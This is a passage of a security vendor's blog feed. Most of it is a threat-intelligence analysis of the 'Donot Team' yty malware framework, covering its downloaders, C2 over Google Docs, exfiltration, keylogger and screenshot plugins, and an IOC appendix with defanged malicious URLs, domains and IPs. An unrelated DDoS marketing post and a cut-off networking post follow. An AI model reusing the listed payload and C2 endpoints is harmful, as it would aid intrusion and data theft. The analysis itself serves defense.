	<ul><li>Gmail webmail service</li>
	</ul></li>
	<li>serviceupports[.]com
	<ul><li>Generic services domains</li>
	</ul></li>
	<li>sundayobserver[.]net
	<ul><li>Mimics weekly English-language newspaper in Sri Lanka</li>
	</ul></li>
	<li>thebangladeshtoday[.]net
	<ul><li>English version of the national daily newspaper in Bangladesh</li>
	</ul></li>
</ul><p>The actors use false personas to register their domains instead of opting for privacy protection services.  Depending on the registrar service chosen, this could be seen as another cost control measure.  The actors often used typo-squatting to slightly alter a legitimate domain name. In contrast, the registration information used accurate spelling, possibly indicating the domain naming was intentional, typos included. Each unique registrant usually registered only a few domains, but mistakenly reused phone numbers or the registration data portrayed a similar pattern across domains. Looking at shared IP infrastructure, it was easy to see the registration patterns and expand the network used by the attackers. The Donot Team relies heavily on subdomains.  Nearly every domain discovered through the course of this investigation had multiple, unique subdomains and every malware sample analyzed communicated to subdomains.  In at least two instances, the domain never resolved to an IP address. Instead, the malware used subdomains, which lead to active infrastructure. Many of the sub-domains only navigated to the third level, but other samples used overly complex subdomain structures down to the sixth or seventh level.</p>

<ul><li>update.&lt;domain&gt;[.]com</li>
	<li>service.&lt;domain&gt;[.]org</li>
	<li>mail-live.outlook-com.332dhgka93t-veri9fjg3j-2s33gl.system.thebangladeshtoday[.]net</li>
</ul><p>Looking at registration patterns and passive DNS, many of these domains resolve for as little as three days before going offline. It is possible the attackers use these small windows to test their malware operations. Although we did not observe the original distribution of the core binary, we believe the group specifically targeted Pakistani individuals based on the decoy documents observed.  They appeared to be official Government of Pakistan memos, see <strong>Figure 1</strong>, above.</p>

<h2>Attribution</h2>

<p>Donot Team’s TTPs, infrastructure, and the malware code are strikingly similar to the EHDevel malware reported by BitDefender and is likely the same group of operators.  Bitdefender noted that the EHDevel malware appeared similar to malware analyzed by Blue Coat Labs in their report “<a href="https://github.com/aptnotes/data/files/679036/Snake.In.The.Grass.-.Python-based.Malware.Used.For.Targeted.Attacks.-.BLUE.COAT.LABS.pdf">Snake in the Grass</a>”.  The “Snake in the Grass” report also showed malware similarities and infrastructure overlap with Operation Hangover (also known as the Patchwork Group).  While Arbor agrees that there are suspicious similarities between the Donot Team and Patchwork, we did not uncover definitive evidence to link the two groups. Additionally, a malicious document associated with yty was <a href="https://twitter.com/HybridAnalysis/status/968958087712460800">tagged</a> by Hybrid Analysis as “Viceroy Tiger”, but there hasn’t been much recent public information on this group that we could find to corroborate.</p>

<p><strong>yty Malware Framework Analysis</strong></p>

<p>One of the TTPs associated with the Donot Team is the use of modular/plugin-based malware frameworks. We call the new malware framework “yty” (based on debugging strings in its components). The components of the framework are shown in <strong>Figure 2</strong>: </p>

<p><a href="http://asert.arbornetworks.com/donot-team-leverages-new-modular-malware-framework-south-asia/file_drops/" rel="attachment wp-att-9483"><img alt="" class="wp-image-9483" height="467" src="//www.arbornetworks.com/blog/asert/wp-content/uploads/2018/03/file_drops-1024x797.png" width="600" /></a> <img alt="yty malware component" data-entity-type="file" data-entity-uuid="c8d3b9cb-9b08-4ddf-a985-2488d66fc664" src="http://localhost:7996/sites/default/files/inline-images/yty%20malware%20component.png" /></p>

<p>Figure 2: yty malware components.</p>

<p><strong>Circular.xls Analysis</strong></p>

<p>The first piece of the framework is a malicious Excel document named “Cirular.xls” (9ce56e1403469fc74c8ff61dde4e83ad72597c66ce07bbae12fa70183687b32d). The content of the spreadsheet is an executable that is extracted and executed by macros, <strong>Figure 3.</strong></p>

<p><img alt="Circular.xls macro script" data-entity-type="file" data-entity-uuid="480d9899-d98b-4f0b-b5a6-76be099fcf8e" src="http://localhost:7996/sites/default/files/inline-images/Circularxls%20macro%20script.png" /><br /><a href="http://asert.arbornetworks.com/donot-team-leverages-new-modular-malware-framework-south-asia/macro1/" rel="attachment wp-att-9484"><img alt="" class="wp-image-9484" height="393" src="//www.arbornetworks.com/blog/asert/wp-content/uploads/2018/03/macro1.png" width="600" /></a> Figure 3: Circular.xls macro script</p>

<p>The delivery mechanism for the XLS file is unknown, but evidence suggests it could be a test document as seen in <strong>Figure 4</strong>:<a href="http://asert.arbornetworks.com/donot-team-leverages-new-modular-malware-framework-south-asia/metadata/" rel="attachment wp-att-9486"><img alt="" class="size-full wp-image-9486" height="142" src="//www.arbornetworks.com/blog/asert/wp-content/uploads/2018/03/metadata.png" width="367" /></a></p>

<p><img alt="XLS document properties " data-entity-type="file" data-entity-uuid="68763ac0-2da7-47e5-b161-aaf460031176" src="http://localhost:7996/sites/default/files/inline-images/XLS%20document%20properties%C2%A0.png" /></p>

<p>Figure 4: XLS document properties </p>

<p><strong>.exe (Downloader 1)  Analysis</strong></p>

<p><strong>SHA256:</strong></p>

<p>8d7eb0b7251bc4a40ebc9142a59ed8af16fb11cf8168e76dca48a78d6d7e4595</p>

<p><strong>Compilation Date:</strong> 2018-02-05 09:06:13</p>

<p><strong>PDB Path:</strong> C:\Users\donot\Documents\Visual Studio 2010\Projects\downloader\Debug\downloader.pdb</p>

<p>Due to a bug in the macro code, the extracted executable is saved as “.exe”. This is a stripped down C++ program that, as its PDB path string indicates, downloads and executes another executable, then removes itself. The downloader attempts to retrieve and execute the following file (not active at the time of research):</p>

<ul><li><a href="http://conf.serviceupdateres[.]com/Setup.exe">http://conf.serviceupdateres[.]com/Setup.exe</a>

	<ul><li>This host is a direct overlap with the EHDevel malware framework as it was also seen distributing payloads in Bitdefender’s analysis.</li>
	</ul></li>
</ul><p><strong>Setup.exe (Downloader 2) Analysis</strong></p>

<p><strong>SHA256:</strong> 6bbd10ac20782542f40f78471c30c52f0619b91639840e60831dd665f9396365</p>

<p><strong>Compilation Date:</strong> 2018-01-04 09:43:28</p>

<p><strong>PDB Path:</strong> C:\Users\803\Desktop\ytyboth\yty 2.0\Release\Setup.pdb</p>

<p>Setup.exe is another downloader written in C++ but contains more functionality than the “.exe” downloader. First, it checks/creates a mutex named “toptwo” so that only one copy of itself is running on the victim.</p>

<p><em>Evasion Techniques</em></p>

<p>To confuse malware analysts, it mixes in junk code as seen in <strong>Figure 5</strong>. </p>

<p><a href="http://asert.arbornetworks.com/donot-team-leverages-new-modular-malware-framework-south-asia/junk_code/" rel="attachment wp-att-9487"><img alt="" class="wp-image-9487" height="251" src="//www.arbornetworks.com/blog/asert/wp-content/uploads/2018/03/junk_code.png" width="600" /></a> <img alt="Junk code contained in binary" data-entity-type="file" data-entity-uuid="e12a4c73-de90-435e-88e1-a890ae2dfdaf" src="http://localhost:7996/sites/default/files/inline-images/Junk%20code%20contained%20in%20binary.png" /></p>

<p>Figure 5: Junk code contained in binary.</p>

<p>It also has some basic anti-sandbox detection that tries to detect Virtual PC, Sandboxie, and VMware (example in <strong>Figure 6</strong>):</p>

<p><img alt="VMWare check" data-entity-type="file" data-entity-uuid="64083936-5b70-47b9-845c-3b958053d404" src="http://localhost:7996/sites/default/files/inline-images/VMWare%20check.png" /><br /><a href="http://asert.arbornetworks.com/donot-team-leverages-new-modular-malware-framework-south-asia/anti_vm/" rel="attachment wp-att-9497"><img alt="" class="size-full wp-image-9497" height="66" src="//www.arbornetworks.com/blog/asert/wp-content/uploads/2018/03/anti_vm.png" width="380" /></a> Figure 6: VMWare check.</p>

<p><em>Debugging Code</em></p>

<p>Similar to some components in the EHDevel framework, it creates logs for debugging purposes, though the messages are not as verbose as in EHDevel’s samples, <strong>Figure 7</strong>.</p>

<p><img alt="Debugging log" data-entity-type="file" data-entity-uuid="185fe713-375b-452e-9328-76f42cd3a73f" src="http://localhost:7996/sites/default/files/inline-images/Debugging%20log.png" /><br /><a href="http://asert.arbornetworks.com/donot-team-leverages-new-modular-malware-framework-south-asia/debug_log/" rel="attachment wp-att-9488"><img alt="" class="size-full wp-image-9488" height="37" src="//www.arbornetworks.com/blog/asert/wp-content/uploads/2018/03/debug_log.png" width="324" /></a> Figure 7: Debugging log</p>

<p><em>Command &amp; Control</em> Much like EHDevel, in order to get its C2 host, it downloads a file from Google Docs. The document in this case was located at:</p>

<ul><li><a href="https://drive.google[.]com/uc?authuser=0&amp;id=1BUuYXU6bLdH_k_NWQIo7n5Uo_7L-uZSu&amp;export=download">https://drive.google[.]com/uc?authuser=0&amp;id=1BUuYXU6bLdH_k_NWQIo7n5Uo_7…</a></li>
</ul><p>At the time of research, the name of the document was “ip2.txt” and it contained the following IP address:</p>

<ul><li>5.135.199[.]0</li>
</ul><p>Per its metadata, the owner of the document is:</p>

<ul><li>Alfred Vilfi</li>
	<li><a href="mailto:masterplan00007@gmail.com">masterplan00007@gmail.com</a></li>
</ul><p>An example C2 beacon is show in <strong>Figure 8</strong>:</p>

<p><img alt="C2 beacon" data-entity-type="file" data-entity-uuid="e8d57dde-752f-4f99-8e35-3cdd65d675cc" src="http://localhost:7996/sites/default/files/inline-images/C2%20beacon.png" /><br /><a href="http://asert.arbornetworks.com/donot-team-leverages-new-modular-malware-framework-south-asia/setup_phonehome/" rel="attachment wp-att-9489"><img alt="" class="wp-image-9489" height="564" src="//www.arbornetworks.com/blog/asert/wp-content/uploads/2018/03/setup_phonehome.png" width="600" /></a> Figure 8: C2 beacon</p>

<p>Based on the “/football/goal”, “score”, “ball”, and “loose” strings they are using a football theme to help disguise its traffic. The POST data contains:</p>

<ul><li>CPU information</li>
	<li>Windows version</li>
	<li>Is a virtual machine?</li>
	<li>Computer name</li>
	<li>User name</li>
	<li>Serial number of main disk volume</li>
</ul><p>At the time of analysis, we only elicited a “loose” response from the C2 server. Continued execution is reliant on eliciting a “win” response. If a “win” response does not occur, the malware continues beaconing until it receives the appropriate response. Once the correct response is seen, the malware downloads the next component from the same C2 using the following URL path:</p>

<ul><li>/football/download/2/boothelp</li>
</ul><p><em>Persistence Mechanism</em></p>

<p>A secondary macro in circular.xls establishes persistence for the setup.exe download as seen in <strong>Figure 9</strong>. </p>

<p><a href="http://asert.arbornetworks.com/donot-team-leverages-new-modular-malware-framework-south-asia/macro2/" rel="attachment wp-att-9490"><img alt="" class="wp-image-9490" height="101" src="//www.arbornetworks.com/blog/asert/wp-content/uploads/2018/03/macro2.png" width="600" /></a> <img alt="Persistence mechanism" data-entity-type="file" data-entity-uuid="4740c8e9-12e1-47c3-a447-bcb16ec2c36d" src="http://localhost:7996/sites/default/files/inline-images/Persistence%20mechanism.png" /></p>

<p>Figure 9: Persistence mechanism</p>

<p><em>Unique Strings</em></p>

<p>Setup.exe introduces three common names seen in the rest of the malware framework:</p>

<ul><li>“yty”, the name we use for the framework, from the PDB path string.</li>
	<li>“bigdata” from the schtasks /tn (taskname) parameter used in the persistence mechanism.</li>
	<li>A “bot id” consisting of computer name, user name, and volume serial number separated by dashes.</li>
</ul><p><strong>boothelp.exe – Plugin Downloader</strong></p>

<p><strong>SHA256:</strong></p>

<p>a2e9d9a00e7e75ab1d5e96dd327a89b55608a0319461f2866aadada5bd50e728</p>

<p><strong>Compilation Date:</strong> 2018-01-03 09:42:00</p>

<p><strong>PDB Path:</strong> C:\Users\803\Desktop\ytyboth\yty 2.0\Release\boothelp.pdb</p>

<p>Another TTP used by the Donot Team is the transition from one programming language to another.  We see this with boothelp.exe, which is written in .NET--instead of C++ like the other components. boothelp.exe is a downloader responsible for retrieving modules/plugins that contain added functionality.</p>

<p>The plugin downloader uses the same C2 channels as setup.exe by downloading a Google Doc file which contains the C2 IP address. It then continues the football theme by beaconing to the “/football/flag” folder on the C2 server, <strong>Figure 10</strong>.</p>

<p><img alt="C2 communications to retrieve modules" data-entity-type="file" data-entity-uuid="8236973f-d9ff-4596-8f97-f7b23f6ace62" src="http://localhost:7996/sites/default/files/inline-images/C2%20communications%20to%20retrieve%20modules.png" /><br /><a href="http://asert.arbornetworks.com/donot-team-leverages-new-modular-malware-framework-south-asia/boothelp_phonehome/" rel="attachment wp-att-9492"><img alt="" class="wp-image-9492" height="684" src="//www.arbornetworks.com/blog/asert/wp-content/uploads/2018/03/boothelp_phonehome.png" width="600" /></a> Figure 10: C2 communications to retrieve modules</p>

<p>Using an HTML &lt;div&gt; element labeled “pcinfo”—possibly displayed verbatim in the C2 panel—the malware beacon message contains various pieces of system information outlined below:</p>

<ul><li>User name</li>
	<li>Computer name</li>
	<li>Windows version</li>
	<li>Number of processors</li>
	<li>System directory</li>
	<li>Domain name</li>
	<li>.NET version</li>
	<li>Information on drives</li>
	<li>CPU information</li>
</ul><p>The response from the C2 is an odd string containing multiple pieces, delimited by various characters, but boils down to what plugins to download/run and their file sizes. The plugins for this framework were downloaded from the same URI path (“/football/download/2/”) where boothelp.exe was located. As of February 2018, we observed the following plugins:</p>

<ul><li>vstservice.exe – document listing plugin</li>
	<li>abode.exe – file exfiltration plugin</li>
	<li>mdriver.exe – key logger plugin</li>
	<li>dspcheck.exe – screenshot plugin</li>
	<li>mboard.exe – system information plugin</li>
</ul><p>These modules share functionality with components of the EHDevel framework, creating further overlap between the two malware frameworks. boothelp.exe has an interesting but unused function that takes a list of benign URLs and opens connections to them. As noted previously, we believe the actors are still testing the malware framework and it’s possible these URLs will become an anti-analysis feature to hide C2 communication among benign traffic. Some of the interesting benign URLs listed below:</p>

<ul><li><a href="https://www.google[.]co.in/">https://www.google[.]co.in/</a></li>
	<li><a href="http://www.imdb[.]com/title/tt3501632/">http://www.imdb[.]com/title/tt3501632/</a></li>
	<li><a href="https://www.rottentomatoes[.]com/m/thor_ragnarok_2017">https://www.rottentomatoes[.]com/m/thor_ragnarok_2017</a></li>
</ul><p><strong>vstservice.exe – File Listing Plugin</strong></p>

<p><strong>SHA256:</strong> e3fb0ab2f3d11f12c11b3ee1e1781eaec5581def820afe7e01902f31ba9e1936</p>

<p><strong>Compilation Date:</strong> 2018-01-03 08:14:32</p>

<p><strong>PDB Path:</strong> C:\Users\803\Desktop\ytyboth\yty 2.0\Release\vstservice.pdb The vstservice.exe plugin is .NET file responsible for sending a list of the file system to the C2. The malware retrieves the C2 from a Google Docs file like the previous binaries. The file was located at the following location:</p>

<ul><li><a href="https://docs.google[.]com/uc?id=0B42CqDoBbigYM1lEamRDRjhFbGc&amp;export=download">https://docs.google[.]com/uc?id=0B42CqDoBbigYM1lEamRDRjhFbGc&amp;export=dow…</a></li>
</ul><p>At the time of research, the Google Doc was named “domain.txt” and contained the following C2 host:</p>

<ul><li>upload.cloudsekurity[.]online</li>
</ul><p>Per its metadata, it is owned by the same owner as the document above. The plugin sends two file listings. The first one focuses on files with the following extensions:</p>

<ul><li>ppt</li>
	<li>pdf</li>
	<li>doc</li>
	<li>xls</li>
	<li>docx</li>
	<li>xlsx</li>
	<li>pptx</li>
	<li>docm</li>
	<li>rtf</li>
	<li>inp</li>
	<li>xlsm</li>
	<li>csv</li>
	<li>odt</li>
	<li>pps</li>
	<li>vcf</li>
</ul><p>The second one contains all other files. An example is shown in <strong>Figure 11</strong>.</p>

<p><img alt="C2 file list name exfiltration" data-entity-type="file" data-entity-uuid="df4e59f4-24e2-45a2-a61e-61262f5591df" src="http://localhost:7996/sites/default/files/inline-images/C2%20file%20list%20name%20exfiltration.png" /><br /><a href="http://asert.arbornetworks.com/donot-team-leverages-new-modular-malware-framework-south-asia/vts_exfil/" rel="attachment wp-att-9493"><img alt="" class="wp-image-9493" height="651" src="//www.arbornetworks.com/blog/asert/wp-content/uploads/2018/03/vts_exfil.png" width="600" /></a> Figure 11: C2 file list name exfiltration</p>

<p>The URL path for this C2 references the “bigdata” string observed in the macro persistence mechanism. Some of the POST parameters are unclear, but contain the following items:</p>

<ul><li>status – hardcoded to “Found”</li>
	<li>path – hardcoded to “Unknown”</li>
	<li>pc – bot ID</li>
	<li>type – unclear</li>
	<li>fname – file name</li>
	<li>cnumber – a number representative of large files broken into chunks</li>
	<li>orname – unclear</li>
	<li>ofid – order ID for files broken into chunks</li>
</ul><p>Similar to the plugin downloader, this plugin includes an unused function that connects to benign URLs. Some of the URLs are listed below:</p>

<ul><li><a href="https://www.livechart[.]me/fall-2017/tv">https://www.livechart[.]me/fall-2017/tv</a></li>
	<li>https://500px[.]com/editors</li>
	<li><a href="https://paytm[.]com/metro-card-recharge">https://paytm[.]com/metro-card-recharge</a></li>
</ul><p><strong>abode.exe – File Exfiltration Plugin</strong></p>

<p><strong>SHA256:</strong> 4d0114b1292714a13d43a4c0de3ea4498fa752354ad4f5b73a8ba441af6064ae</p>

<p><strong>Compilation Date:</strong> 2018-01-03 08:14:46</p>

<p><strong>PDB Path:</strong> C:\Users\803\Desktop\ytyboth\yty 2.0\Release\abode.pdb abode.exe is a .NET file  capable of file exfiltration. It uses the same Google Doc document and C2 as the vstservice.exe plugin. Two sets of files can be exfiltrated. The first set is a periodic sending of files generated by other plugins that do not include a C2 mechanism themselves. The second set of files is specified by the C2 as seen in <strong>Figure 12</strong>.</p>

<p><img alt="C2 response specifying file for exfiltration " data-entity-type="file" data-entity-uuid="4f5e96c7-22a8-4f82-895e-981a0af09ff9" src="http://localhost:7996/sites/default/files/inline-images/C2%20response%20specifying%20file%20for%20exfiltration%20.png" /></p>

<p><a href="http://asert.arbornetworks.com/donot-team-leverages-new-modular-malware-framework-south-asia/abode_poll/" rel="attachment wp-att-9494"><img alt="" class="wp-image-9494" height="547" src="//www.arbornetworks.com/blog/asert/wp-content/uploads/2018/03/abode_poll.png" width="600" /></a> Figure 12: C2 response specifying file for exfiltration</p>

<p>The “id” parameter is hardcoded and the “pc” parameter is the bot ID. The file is then sent to the C2 as seen in <strong>Figure 13</strong>.</p>

<p><img alt="File exfiltration" data-entity-type="file" data-entity-uuid="5dd318c0-2b85-4372-9bde-c4770f1d5741" src="http://localhost:7996/sites/default/files/inline-images/13File%20exfiltration.png" /><br /><a href="http://asert.arbornetworks.com/donot-team-leverages-new-modular-malware-framework-south-asia/abobe_file_send/" rel="attachment wp-att-9495"><img alt="" class="wp-image-9495" height="651" src="//www.arbornetworks.com/blog/asert/wp-content/uploads/2018/03/abobe_file_send.png" width="600" /></a> Figure 13: File exfiltration</p>

<p>This plugin also includes unused, benign URLs as seen below:</p>

<ul><li><a href="https://www.gamespot[.]com/">https://www.gamespot[.]com/</a></li>
	<li><a href="https://www.rottentomatoes[.]com/tv/mr_robot/s03">https://www.rottentomatoes[.]com/tv/mr_robot/s03</a></li>
</ul><p><strong>mdriver.exe – Keylogger Plugin</strong></p>

<p><strong>SHA256:</strong> 600e7cfeea0ef8bd23cf95602a6b873898aa51848909aad1a7e8d4c5403797af</p>

<p><strong>Compilation Date:</strong> 2018-01-03 08:14:19</p>

<p><strong>PDB Path:</strong> C:\Users\803\Desktop\ytyboth\yty 2.0\Release\mdriver.pdb This plugin is written in C++ and is a key logger. It checks/creates a mutex named “twotwo“, uses the Windows SetWindowsHookEx and SetWinEventHook APIs to perform its key logging, and then relies on abobe.exe to exfiltrate the captured key strokes. <strong>Figure 14</strong> shows an example of exfiltrated key log data.</p>

<p><img alt="Key log exfiltration" data-entity-type="file" data-entity-uuid="0eeb039d-6138-4bbd-9528-006c3626b091" src="http://localhost:7996/sites/default/files/inline-images/Key%20log%20exfiltration.png" /></p>

<p><a href="http://asert.arbornetworks.com/donot-team-leverages-new-modular-malware-framework-south-asia/keylogger/" rel="attachment wp-att-9499"><img alt="" class="wp-image-9499" height="693" src="//www.arbornetworks.com/blog/asert/wp-content/uploads/2018/03/keylogger.png" width="600" /></a> Figure 14: Key log exfiltration</p>

<p><strong>dspcheck.exe – Screenshot Plugin</strong></p>

<p><strong>SHA256:</strong> 7d893d4f077e8e76a44a7830c5c3806dc956a6ef1a06c9f2dc33477c70f8cc9b</p>

<p><strong>Compilation Date:</strong> 2018-01-09 08:33:36</p>

<p><strong>PDB Path:</strong> D:\Soft\DevelopedCode\yty 2.0\Release\dspcheck.pdb</p>

<p>dspcheck.exe is a screenshot plugin written in .NET. This plugin also shows evidence that the actors are continuing their testing efforts as seen in <strong>Figure 15</strong>. <a href="http://asert.arbornetworks.com/donot-team-leverages-new-modular-malware-framework-south-asia/dsp_testing/" rel="attachment wp-att-9500"><img alt="" class="wp-image-9500" height="75" src="//www.arbornetworks.com/blog/asert/wp-content/uploads/2018/03/dsp_testing.png" width="600" /></a></p>

<p><img alt="Screenshot code shows testing evidence" data-entity-type="file" data-entity-uuid="d1b1d1bb-1d9d-4583-844e-aa6c6f6a68cf" src="http://localhost:7996/sites/default/files/inline-images/Screenshot%20code%20shows%20testing%20evidence.png" /><br />
Figure 15: Screenshot code shows testing evidence</p>

<p>It has the beginnings of C2 functionality, but this sample still relies on abobe.exe to send screenshots back to the C2, see <strong>Figure 16</strong>. </p>

<p><a href="http://asert.arbornetworks.com/donot-team-leverages-new-modular-malware-framework-south-asia/screenshot_exfil/" rel="attachment wp-att-9501"><img alt="" class="wp-image-9501" height="497" src="//www.arbornetworks.com/blog/asert/wp-content/uploads/2018/03/screenshot_exfil.png" width="600" /></a> <img alt="Screenshot exfiltration" data-entity-type="file" data-entity-uuid="3e67671c-a647-443e-ac1f-84c85f7a7b7f" src="http://localhost:7996/sites/default/files/inline-images/Screenshot%20exfiltration.png" /></p>

<p>Figure 16: Screenshot exfiltration</p>

<p><strong>mboard.exe – System Information Plugin</strong></p>

<p><strong>Packed SHA256</strong>: 50281cdd1b22f2b85de5809bf69ebd10e399410f519e357c1cb941c5dc7c95e1</p>

<p>The last plugin seen in this framework was mboard.exe. It is written in Golang and is packed with UPX. The purpose of this plugin is to gather various system information such as the following:</p>

<ul><li>Drive information</li>
	<li>Output of systeminfo command</li>
	<li>Installed software</li>
	<li>Output of ipconfig /all command</li>
	<li>Output of net view command</li>
	<li>Output of tasklist command</li>
</ul><p>The collected is saved into multiple files with a “qr” extension appended. They are then sent to the C2 via abobe.exe. An example showing the running process list being sent to the C2 is shown in <strong>Figure 17</strong>.</p>

<p><img alt="Running process list exfiltration" data-entity-type="file" data-entity-uuid="8221f58a-c118-466c-ae87-397f175103f1" src="http://localhost:7996/sites/default/files/inline-images/Running%20process%20list%20exfiltration.png" /><br /><a href="http://asert.arbornetworks.com/donot-team-leverages-new-modular-malware-framework-south-asia/sysinfo_exfil/" rel="attachment wp-att-9502"><img alt="" class="wp-image-9502" height="497" src="//www.arbornetworks.com/blog/asert/wp-content/uploads/2018/03/sysinfo_exfil.png" width="600" /></a> Figure 17: Running process list exfiltration</p>

<p><strong>Appendix A (IOCs):</strong></p>

<p><em>SHA256 Hashes</em> 9ce56e1403469fc74c8ff61dde4e83ad72597c66ce07bbae12fa70183687b32d 8d7eb0b7251bc4a40ebc9142a59ed8af16fb11cf8168e76dca48a78d6d7e4595 6bbd10ac20782542f40f78471c30c52f0619b91639840e60831dd665f9396365 a2e9d9a00e7e75ab1d5e96dd327a89b55608a0319461f2866aadada5bd50e728 e3fb0ab2f3d11f12c11b3ee1e1781eaec5581def820afe7e01902f31ba9e1936 4d0114b1292714a13d43a4c0de3ea4498fa752354ad4f5b73a8ba441af6064ae 600e7cfeea0ef8bd23cf95602a6b873898aa51848909aad1a7e8d4c5403797af 7d893d4f077e8e76a44a7830c5c3806dc956a6ef1a06c9f2dc33477c70f8cc9b 50281cdd1b22f2b85de5809bf69ebd10e399410f519e357c1cb941c5dc7c95e1 <em>C2 Domains</em> conf[.]serviceupdateres[.]com upload[.]cloudsekurity[.]online abodeupdater[.]com qmails[.]org serviceupports[.]com thebangladeshtoday[.]net sundayobserver[.]net <em>C2 IP Addresses</em> 5[.]135[.]199[.]0 89[.]33[.]246[.]99</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/blog-category/asert">ASERT</category>
    <enclosure url="http://localhost:7996/sites/default/files/DONOTTEAM.png" length="133946" type="image/png"/>
    <guid isPermaLink="false">08d56ef0-d40c-48e5-b4b2-df436e3b8eff</guid>
    <pubDate>Thu, 08 Mar 2018 09:39:42 -0500</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>ASERT Team</dc:creator>
    </item>
<item>
  <title>Managed DDoS Service: What Separates Good from Great</title>
  <link>http://localhost:7996/blog/managed-ddos-service</link>
  <description>The case for a managed DDoS protection and mitigation service is well established. Partnering with a provider that can oversee the system’s operation takes a big IT issue off your plate, augments your staff resources, and gives you access to specialized DDoS expertise. But not all managed DDoS services are alike. How can you tell a great one from a merely good one? Here are the...</description>
  <content:encoded><![CDATA[<p>The case for a managed <a href="https://www.arbornetworks.com/ddos-protection-products">DDoS protection</a> and mitigation service is well established. Partnering with a provider that can oversee the system’s operation takes a big IT issue off your plate, augments your staff resources, and gives you access to specialized DDoS expertise. But not all managed DDoS services are alike. How can you tell a great one from a merely good one? Here are the hallmarks to look for.</p>

<p><strong>Flexibility to Handle Custom Workflows </strong></p>

<p>You may already have some operational processes and procedures in place for dealing with DDoS threats. A managed service provider should be able to adapt and align to you, rather than requiring you to change your processes. For example, what is your contact and communication protocol? Under what scenarios do you want the service provider to initiate mitigation action on its own, or seek your authorization? Can the provider support different actions based on different alert types or event levels? A great provider will take the time to understand your processes and have the flexibility to work within them. With many vendors, even good ones, it’s their way or no way.</p>

<p><strong>Customer-Focused Reporting and Intelligence </strong></p>

<p>A good DDoS provider will deliver reports detailing the latest incidents and the actions taken in response to security events. A great one will take a more proactive, consultative approach that leverages global threat intelligence as the basis for recommendations to improve your security posture. A managed service provider should also be able to supply executive-level reporting that enables you to demonstrate ROI and key metrics for the C-suite.</p>

<p><strong>Size of Network </strong></p>

<p><a href="https://www.arbornetworks.com/stakes">DDoS attacks</a> are growing in sheer size and rapidly approaching terabyte territory, due largely to amplification techniques and the emergence of Internet of Things (IoT) botnets. The capacity to absorb and disperse the largest known attacks is simply a must. Equally important is a distributed infrastructure, with multiple locations that enables mitigation to take place as close to the source of attack as possible. This not only avoids “choke points” — it accelerates time-to mitigation cycles.</p>

<p>While absolute network size is an important consideration, so too is the amount of capacity dedicated to DDoS mitigation. For instance, some content delivery networks and web service providers, that boast enormous network capacity, may offer DDoS protection as a sideline. But it only stands to reason that they will dedicate most of their network capacity to their main line of business, leaving their DDoS customers at risk.</p>

<p>That’s why a dedicated provider is critical to mitigating massive attacks. Having said that, managed service providers support multiple customers, and there is always the risk that several will be hit at once. It is not enough, therefore, to have capacity levels that are equal to or even twice the size of any potential attack. Rather, the network must be several orders of magnitude larger than the largest known attacks. Ten terabytes of capacity is quickly becoming the standard that will define the modern, managed DDoS provider.</p>

<p><strong>Experience of Team </strong></p>

<p>A good provider will be highly reliant on automation. Certainly, automation plays an important role in effective DDoS protection, but it can’t always distinguish good traffic from bad. Left unchecked it is likely to block legitimate traffic and generate a lot of false positives. Thwarting nefarious actors takes human intelligence – the ability to recognize and analyze a real attack, understand its origins and quickly determine its objectives. A great provider will have dedicated research teams with decades of experience studying, analyzing and overseeing the successful mitigation of DDoS attacks. And it will have a deep bench of security expertise with diverse professional backgrounds and complementary skills.</p>

<p><strong>Best-Practice Hybrid Solution </strong></p>

<p>Many managed service offerings are entirely cloud based. That means 100% of mitigation takes place in an “always on” cloud-based system, which can quickly get expensive. Increasingly, security experts agree that a hybrid solution, combining on-premise and cloud capabilities, is the best defense against DDoS attacks. The on-premise component can typically capture the vast majority of malicious traffic. If an attack threatens to exhaust the capacity of an on-premise appliance, the cloud capability can automatically activate.</p>

<p>What’s more, a hybrid solution is less expensive and a better value than you might think. These days, on-premise defenses can be virtualized. With a fully managed service, costs are offset by a reduction in staffing requirements. And you only pay for as much cloud capacity you consume.</p>

<p>When you add it all up, why settle for good?</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/security">Security</category>
    <enclosure url="http://localhost:7996/sites/default/files/GoodvGreat%201200x480.jpg" length="277806" type="image/jpeg"/>
    <guid isPermaLink="false">1f206f86-7631-4f1e-957b-21c5f1da171c</guid>
    <pubDate>Wed, 07 Mar 2018 13:14:20 -0500</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>Kevin Whalen</dc:creator>
    </item>
<item>
  <title>Why Packet Flow Switches Should Be Like Social Media</title>
  <link>http://localhost:7996/blog/why-packet-flow-switches-should-be-social-media</link>
  <description>No travel this week, so I’ve been getting caught up and up to date in all my social media venues and online content. In doing so, I watched the premier of a new show called Living Biblically, long story, but interest stems from a family connection by marriage and the show was quite entertaining – that last part is in case a family member is reading this. A premise on the show...</description>
  <content:encoded><![CDATA[<p>No travel this week, so I’ve been getting caught up and up to date in all my social media venues and online content.&nbsp; In doing so, I watched the premier of a new show called Living Biblically, long story, but interest stems from a family connection by marriage and the show was quite entertaining – that last part is in case a family member is reading this.&nbsp; A premise on the show was that people’s obsession with smart phones was akin to “worshiping false idols.”&nbsp; Well, that got me thinking, what are people doing staring into these small peep holes into the swarming ooze of personal opinions and attempts by every person on the planet to be the star of their own reality show?&nbsp; Why social media APPs use of course!</p>

<p>Every application out there comes with its own set of “filters” what you want to see and so often what you don’t want to see.&nbsp; Sometimes you are even provided with some over-arching stats based on your filters.&nbsp; Consider the whole “#” hash-tag phenomenon about what is trending, but more importantly, what is trending in the topics you are interested in.&nbsp; IF these filters were not there, you would need to be heavily medicated in a facility and becoming a drain on society!</p>

<p>Anyway, what does this all have to do with my premise that Packet Flow-based switches should be like social media?&nbsp; Well, how about EVERYTHING?&nbsp; Let’ start with the fact that packet-based data is the richest single data source to tap for information for any application for any device.&nbsp; There are very few applications anymore that don’t need to talk to something.&nbsp; An application and what it runs on might need to talk end users, or another device like service for DNS or authentication, or other devices like IoT or robots.&nbsp;&nbsp; Inside that communications there is so much raw detail and from that representative meta-data.&nbsp; This data represents Latency and Delay measurements as well as volume of data and counts of transactions by type of transaction and even positive versus negative transaction responses.&nbsp; Names of users and geographic associations can be determined.&nbsp; Nefarious activity can be determined and cyber campaigns methods identified.&nbsp; Big data implications are massive.</p>

